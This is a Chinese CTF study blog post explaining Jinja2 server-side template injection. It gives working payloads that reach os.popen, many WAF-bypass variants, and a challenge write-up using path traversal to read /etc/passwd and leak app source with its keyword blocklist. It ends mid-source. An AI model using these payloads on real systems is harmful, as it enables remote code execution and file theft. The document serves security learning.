<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>服务端模板注入(SSTI) | 楽のsecret base</title><meta name="author" content="楽依"><meta name="copyright" content="楽依"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="奖励你删掉焚靖（">
<meta property="og:type" content="article">
<meta property="og:title" content="服务端模板注入(SSTI)">
<meta property="og:url" content="https://leyi.live/2025/11/26/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5(SSTI)/index.html">
<meta property="og:site_name" content="楽のsecret base">
<meta property="og:description" content="奖励你删掉焚靖（">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://leyi.live/img/post3.jpg">
<meta property="article:published_time" content="2025-11-26T05:51:13.000Z">
<meta property="article:modified_time" content="2025-11-28T12:33:45.991Z">
<meta property="article:author" content="楽依">
<meta property="article:tag" content="python">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://leyi.live/img/post3.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "服务端模板注入(SSTI)",
  "url": "https://leyi.live/2025/11/26/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5(SSTI)/",
  "image": "https://leyi.live/img/post3.jpg",
  "datePublished": "2025-11-26T05:51:13.000Z",
  "dateModified": "2025-11-28T12:33:45.991Z",
  "author": [
    {
      "@type": "Person",
      "name": "楽依",
      "url": "https://leyi.live"
    }
  ]
}</script><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="https://leyi.live/2025/11/26/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5(SSTI)/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '服务端模板注入(SSTI)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><style>
  #custom-loading {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: #0B0B0B;
    z-index: 9999;
    display: flex;
    justify-content: center;
    align-items: center;
    transition: opacity 0.5s ease;
  }
  .loading-content {
    position: relative;
    width: 100%;
    height: 100%;
  }
  .loading-content span {
    width: 8vmin;
    height: 8vmin;
    border-radius: 4vmin;
    backface-visibility: hidden;
    position: absolute;
    animation-name: loadingMove;
    animation-timing-function: cubic-bezier(0.4, 0, 1, 0.8);
    animation-iteration-count: infinite;
    animation-duration: 3s;
    top: 50%;
    left: 50%;
    transform-origin: -4vmin center;
  }
  .loading-content span:nth-child(1) { background: #E5E6E5; animation-delay: -0.5s; opacity: 0; }
  .loading-content span:nth-child(2) { background: #494A49; animation-delay: -1s; opacity: 0; }
  .loading-content span:nth-child(3) { background: #8F908F; animation-delay: -1.5s; opacity: 0; }
  .loading-content span:nth-child(4) { background: #E5E6E5; animation-delay: -2s; opacity: 0; }
  .loading-content span:nth-child(5) { background: #494A49; animation-delay: -2.5s; opacity: 0; }
  .loading-content span:nth-child(6) { background: #8F908F; animation-delay: -3s; opacity: 0; }
  @keyframes loadingMove {
    0% { transform: scale(1) rotate(0deg) translate3d(0, 0, 1px); }
    30% { opacity: 1; }
    100% { z-index: 10; transform: scale(0) rotate(360deg) translate3d(0, 0, 1px); }
  }
</style>
<script>
  // 立即写入加载动画，不等待任何事件
  document.write(`
    <div id="custom-loading">
      <div class="loading-content">
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
      </div>
    </div>
  `);
</script>
<meta name="generator" content="Hexo 8.1.1"></head><body><div id="web_bg" style="background-image: url(/img/background.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><span> 链接</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/post3.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/bar0.gif" alt="Logo"><span class="site-name">楽のsecret base</span></a><a class="nav-page-title" href="/"><span class="site-name">服务端模板注入(SSTI)</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><span> 链接</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">服务端模板注入(SSTI)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-26T05:51:13.000Z" title="Created 2025-11-26 13:51:13">2025-11-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-11-28T12:33:45.991Z" title="Updated 2025-11-28 20:33:45">2025-11-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9B%B8%E5%85%B3/">CTF相关</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="服务端模板注入-SSTI"><a href="#服务端模板注入-SSTI" class="headerlink" title="服务端模板注入(SSTI)"></a>服务端模板注入(SSTI)</h1><p><strong>SSTI（Server-Side Template Injection）</strong> 是一种发生在 <strong>服务端</strong> 的代码注入攻击</p>
<p><strong>模板</strong>：在 Web 开发中，模板是一种文件（如 HTML），它包含固定的部分（如页面布局）和动态的“占位符”。这些占位符会在服务器端被真实的数据替换，从而生成最终的 HTML 页面发送给用户</p>
<p><strong>模板引擎</strong>：是用于处理模板的程序。它接收模板文件和数据，然后将数据填充到模板的占位符中，生成最终的 HTML</p>
<p>当一个应用程序将 用户输入 直接拼接到了模板中，并且没有进行适当的过滤处理时，攻击者就可以输入一段恶意的模板代码。服务器在渲染模板时，会将这些恶意代码当作模板指令来执行</p>
<br/>

<h2 id="Jinja2模板引擎-Python-注入"><a href="#Jinja2模板引擎-Python-注入" class="headerlink" title="Jinja2模板引擎(Python)注入"></a>Jinja2模板引擎(Python)注入</h2><p>目前我遇到的极大多数题目都是python的后端jinja2引擎渲染的</p>
<h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><p>我们来看一个最简单的注入payload，它执行的命令读取了<code>/app/flag</code>文件并返回在页面中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">133</span>].__init__.__globals__[<span class="string">&quot;popen&quot;</span>](<span class="string">&#x27;cat /app/flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><code>.__class__</code>是一个属性，它属于 Python 中每一个对象，这个属性的作用是：返回该对象所属的类。在这里，它返回的是<code>&#39;&#39;</code>这个空字符所属的类，如果单独执行，页面会返回<code>&lt;class &#39;str&#39;&gt;</code>，说明它属于<code>str</code>类</p>
<p><code>.__base__</code> 是一个属性，它属于一个类（注意，是类，不是对象），这个属性的作用是：返回该类直接继承的父类。这里就是返回<code>&lt;class &#39;str&#39;&gt;</code>的父类，单独执行会返回<code>&lt;class &#39;object&#39;&gt;</code>，说明<code>&lt;class &#39;str&#39;&gt;</code>继承于<code>&lt;class &#39;object&#39;&gt;</code></p>
<p><code>.__subclasses__[133]</code> 是一个方法，用于获取某个类的所有直接子类，它返回一个列表，包含所有继承自该类的子类对象，后面的[133]表示访问第134个对应的子类，题目环境中单独执行会返回<code>&lt;class &#39;os._wrap_close&#39;&gt;</code></p>
<blockquote>
<p><code>&lt;class &#39;os._wrap_close&#39;&gt;</code>类的意义是作为访问系统级功能的跳板和桥梁，获取所有 os 模块的函数</p>
</blockquote>
<p><code>.__init__</code>这一部分通过属性访问的方式获取了一个函数对象也就是<code>.__init__</code>本身，这一步是为满足<code>.__globals__</code>的访问条件（只有函数对象才有 <code>__globals__</code> 属性），单独访问的回显是<code>&lt;function _wrap_close.__init__ at 0x7f32e4975af0&gt;</code>，说明已经成功访问到了，内存地址是<code>0x7f32e4975af0</code></p>
<p><code>.__globals__</code>是在访问这个函数对象的globals属性，这基本上相当于获得了整个 <code>os</code> 模块的完整访问权限，单独使用获得会获得一个庞大的字典</p>
<p><code>[&#39;popen&#39;]</code>是在通过键名索引获取这个函数，单独使用返回<code>&lt;function popen at 0x7f3d170639d0&gt;</code>代表成功获取<code>(&#39;cat /flag&#39;)</code>则是我们读取flag的命令，返回的是一个类文件对象，比如此处输出应该是<code>&lt;os._wrap_close object at 0x7f3d15552430&gt;</code></p>
<p><code>.read()</code>是一个方法，用于从文件对象或类文件对象中读取数据，此处用于读取命令的输出，返回<code>flag&#123;······&#125;</code>，此时便完成了SSTI注入的整一个流程</p>
<br/>

<p>类似的，以下payload也可能实现一定功能</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[X].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125; //利用__builtins__函数字典中的<span class="built_in">eval</span>函数执行python代码</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[X].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read()&#125;&#125; //直接调用os模块</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">133</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].os.popen(<span class="string">&#x27;ls /&#x27;</span>).read()&#125;&#125; //借用linecache模块间接调用os模块</span><br></pre></td></tr></table></figure>

<br/>

<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><blockquote>
<p>真正做题哪有那么容易，出题人会设置各种各样的waf刁难你</p>
</blockquote>
<h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><table>
<thead>
<tr>
<th>过滤器函数</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>length()</code></td>
<td>获取一个序列或字典的长度并将其返回</td>
</tr>
<tr>
<td><code>int()</code></td>
<td>将值转换成int类型</td>
</tr>
<tr>
<td><code>float()</code></td>
<td>将值转换成float类型</td>
</tr>
<tr>
<td><code>lower()</code></td>
<td>将字符串转换成小写</td>
</tr>
<tr>
<td><code>upper()</code></td>
<td>将字符串转换为大写</td>
</tr>
<tr>
<td><code>reverse()</code></td>
<td>反转字符串</td>
</tr>
<tr>
<td><code>replace(value,old,new)</code></td>
<td>将value中的old替换为new</td>
</tr>
<tr>
<td><code>list()</code></td>
<td>将变量转换成列表类型</td>
</tr>
<tr>
<td><code>string()</code></td>
<td>将变量（键值）转换成字符串类型</td>
</tr>
<tr>
<td><code>join()</code></td>
<td>将一个序列中的键拼接成字符串，通常有python内置的<code>dict()</code>配合使用</td>
</tr>
<tr>
<td><code>attr()</code></td>
<td>获取对象的属性</td>
</tr>
</tbody></table>
<br/>

<h4 id="过滤双花括号"><a href="#过滤双花括号" class="headerlink" title="过滤双花括号"></a>过滤双花括号</h4><p>以下大量借鉴<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73185293/article/details/131695528">SSTI漏洞利用及绕过总结(绕过姿势多样)</a></p>
<p>可将<code>&#123;&#123; &#125;&#125;</code>使用<code>&#123;% %&#125;</code>绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[X].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).read()) %&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>&#123;&#123; &#125;&#125;</code>：用于输出表达式的结果<br><code>&#123;% %&#125;</code>：用于执行语句和控制流程</p>
</blockquote>
<h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤[ ]"></a>过滤<code>[ ]</code></h4><p>魔术方法<code>__getitem__</code>可代替中括号</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__().__getitem__(X).__getitem__(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;cat /flag&#x27;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="过滤-、"><a href="#过滤-、" class="headerlink" title="过滤&#39;&#39;、&quot;&quot;"></a>过滤<code>&#39;&#39;</code>、<code>&quot;&quot;</code></h4><p>当单双引号被过滤后，可以使用get或者post传参输入需要带引号的内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__base__.__subclasses__()[X].__init__.__globals__[request.args.popen](request.args.cmd).read() &#125;&#125;</span><br><span class="line">同时get传参?popen=popen&amp;cmd=cat /flag</span><br><span class="line">&#123;&#123; ().__class__.__base__.__subclasses__()[X].__init__.__globals__[request.form.popen](request.form.cmd).read() &#125;&#125;</span><br><span class="line">同时post传参?popen=popen&amp;cmd=cat /flag</span><br></pre></td></tr></table></figure>

<p>也可以对globals字典构造（几乎所有的符号都可以找到）</p>
<h4 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤_"></a>过滤<code>_</code></h4><p>当下划线被过滤后，可以使用过滤器输入下划线</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(X) %&#125; //在列表中选中<span class="string">&#x27;_&#x27;</span>即可</span><br></pre></td></tr></table></figure>

<p>或者分开传参</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ()|attr(request.form.p1)|attr(request.form.p2)|attr(request.form.p3)()|attr(request.form.p4)(X)|attr(request.form.p5)|attr(request.form.p6)|attr(request.form.p7)(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;cat /flag&#x27;</span>)|attr(<span class="string">&#x27;read&#x27;</span>)() &#125;&#125;</span><br><span class="line">同时post传参p1=__class__&amp;p2=__base__&amp;p3=__subclasses__&amp;p4=__getitem__&amp;p5=__init__&amp;p6=__globals__&amp;p7=__getitem__</span><br></pre></td></tr></table></figure>

<p>或者进行16位编码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ()[<span class="string">&#x27;\x5f\x5fclass\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x5f\x5fbase\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x5f\x5fsubclasses\x5f\x5f&#x27;</span>]()[X][<span class="string">&#x27;\x5f\x5finit\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="过滤-2"><a href="#过滤-2" class="headerlink" title="过滤."></a>过滤<code>.</code></h4><p>使用中括号绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ()[<span class="string">&#x27;__class__&#x27;</span>][<span class="string">&#x27;__base__&#x27;</span>][<span class="string">&#x27;__subclasses__&#x27;</span>]()[X][<span class="string">&#x27;__init__&#x27;</span>][<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>也可以使用过滤器arrt()函数绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ()|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(X)|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;cat /flag&#x27;</span>)|attr(<span class="string">&#x27;read&#x27;</span>)() &#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><p>+号拼接绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ()[<span class="string">&#x27;__cl&#x27;</span>+<span class="string">&#x27;ass__&#x27;</span>] &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>或使用Jinjia2的～号拼接</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=<span class="string">&#x27;__cl&#x27;</span> %&#125;&#123;% <span class="built_in">set</span> b=<span class="string">&#x27;ass__&#x27;</span> %&#125;&#123;% <span class="built_in">set</span> c=<span class="string">&#x27;__ba&#x27;</span> %&#125;&#123;% <span class="built_in">set</span> d=<span class="string">&#x27;se__&#x27;</span> %&#125;&#123;&#123; ()[a~b][c~d] &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><code>reverse()</code>过滤器绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=<span class="string">&#x27;__ssalc__&#x27;</span>|reverse %&#125;&#123;&#123; ()[a] &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><code>join()</code>过滤器绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=<span class="built_in">dict</span>(__cl=a,ass__=a)|join %&#125;&#123;&#123; ()[a] &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>十六进制等编码亦可</p>
<h4 id="过滤config"><a href="#过滤config" class="headerlink" title="过滤config"></a>过滤config</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config &#125;&#125;</span><br><span class="line">&#123;&#123; get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config &#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="获取特殊符号"><a href="#获取特殊符号" class="headerlink" title="获取特殊符号"></a>获取特殊符号</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=(lipsum|string|<span class="built_in">list</span>) %&#125;</span><br><span class="line">a[<span class="number">1</span>]为小于号,a[<span class="number">9</span>]为空格，a[<span class="number">18</span>]为下划线</span><br></pre></td></tr></table></figure>

<br/>

<h3 id="极客大挑战2025-ez-read"><a href="#极客大挑战2025-ez-read" class="headerlink" title="[极客大挑战2025]ez_read"></a>[极客大挑战2025]ez_read</h3><blockquote>
<p>规矩二蛊都抱怨起来：“人啊，我们老早就告诉过你。我们的名字你最好一个人知晓，不要让其他存在知道。否则我们就要为别的存在所用了。<br>现在好了吧，智慧蛊已经知道了我们的名字，事情麻烦了。”</p>
</blockquote>
<p>登录靶机，注册账号正式开始看题（前面登录并没有什么可以操作地方</p>
<p><code>读取故事</code>页给了一个读取文件的接口，还有几个样例文件可以读，其中的<code>3.txt</code>里面有提示<code>坚持下坚持下去去</code>，可以发现是<strong>重写绕过</strong>，在接口尝试路径穿越<code>../flag</code>会报错<code>文件不存在: flag</code>，看到把<code>../</code>进行了过滤，但是结合hint，可以重写进行路径穿越，比如<code>..././flag</code>，此时报错变成了<code>文件不存在: ../flag</code>，原因在于系统一次性配对了所有<code>../</code>进行了清楚，但是没有进行二次检查，导致重新拼接后的字符串再一次拼凑出了<code>../</code></p>
<br/>

<p>还有比较曲折的办法是用绝对路径，放这里当是熟悉Linux文件结构了，访问<code>/ect/passwd</code>**（ Linux&#x2F;Unix 系统中的用户账户信息文件）**会有如下回显</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">_apt:x:42:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">ctf:x:1000:1000::/opt/___web_very_strange_42___:/bin/sh</span><br></pre></td></tr></table></figure>

<p>文件的最后一行有一个特殊用户<code>ctf</code>，它的家目录很奇怪，可以先锁定这个目录</p>
<p>尝试查询<code>/proc/self/cmdline</code><strong>（Linux 系统中一个特殊的虚拟文件，它提供了当前进程的完整命令行信息）</strong>，会有以下回显</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">python3app.py</span><br></pre></td></tr></table></figure>

<p>结合两次回显，直接用绝对路径访问<code>/opt/___web_very_strange_42___/app.py</code>也可以读源码</p>
<br/>

<p>可以利用路径遍历去寻找源码，尝试多次使用<code>..././app.py</code>即可读取源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string, redirect, url_for, session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">&quot;templates&quot;</span>, static_folder=<span class="string">&quot;static&quot;</span>)</span><br><span class="line">app.secret_key = <span class="string">&quot;key_ciallo_secret&quot;</span></span><br><span class="line"></span><br><span class="line">USERS = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> payload:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(payload) <span class="keyword">not</span> <span class="keyword">in</span> (<span class="number">114</span>, <span class="number">514</span>):</span><br><span class="line">        <span class="keyword">return</span> payload.replace(<span class="string">&quot;(&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        waf = [<span class="string">&quot;__class__&quot;</span>, <span class="string">&quot;__base__&quot;</span>, <span class="string">&quot;__subclasses__&quot;</span>, <span class="string">&quot;__globals__&quot;</span>, <span class="string">&quot;import&quot;</span>,<span class="string">&quot;self&quot;</span>,<span class="string">&quot;session&quot;</span>,<span class="string">&quot;blueprints&quot;</span>,<span class="string">&quot;get_debug_flag&quot;</span>,<span class="string">&quot;json&quot;</span>,<span class="string">&quot;get_template_attribute&quot;</span>,<span class="string">&quot;render_template&quot;</span>,<span class="string">&quot;render_template_string&quot;</span>,<span class="string">&quot;abort&quot;</span>,<span class="string">&quot;redirect&quot;</span>,<span class="string">&quot;make_response&quot;</span>,<span class="string">&quot;Response&quot;</span>,<span class="string">&quot;stream_with_context&quot;</span>,<span class="string">&quot;flash&quot;</span>,<span class="string">&quot;escape&quot;</span>,<span class="string">&quot;Markup&quot;</span>,<span class="string">&quot;MarkupSafe&quot;</span>,<span 